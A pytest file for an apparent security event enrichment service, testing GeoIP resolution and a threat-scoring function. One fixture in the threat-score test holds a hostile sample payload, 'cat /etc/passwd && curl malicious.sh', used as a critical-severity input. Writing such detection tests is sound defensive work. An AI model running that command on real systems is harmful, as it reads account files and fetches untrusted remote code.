import pytest
import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

from services.enricher.geoip import resolve_geoip
from services.enricher.worker import calculate_threat_score, enrich_event

def test_geoip_resolution_known():
    geo = resolve_geoip("185.220.101.5")
    assert geo["country"] == "Germany"
    assert geo["country_code"] == "DE"
    assert geo["city"] == "Frankfurt"

def test_geoip_resolution_fallback():
    geo = resolve_geoip("12.34.56.78")
    assert "country" in geo
    assert "country_code" in geo
    assert "lat" in geo
    assert "lon" in geo

def test_threat_score_calculation():
    score_low = calculate_threat_score({
        "username": "guest",
        "destination_port": 8080,
        "raw_payload": "ping"
    })
    score_critical = calculate_threat_score({
        "username": "root",
        "destination_port": 22,
        "raw_payload": "cat /etc/passwd && curl malicious.sh"
    })
    assert score_critical > score_low
    assert score_critical <= 100
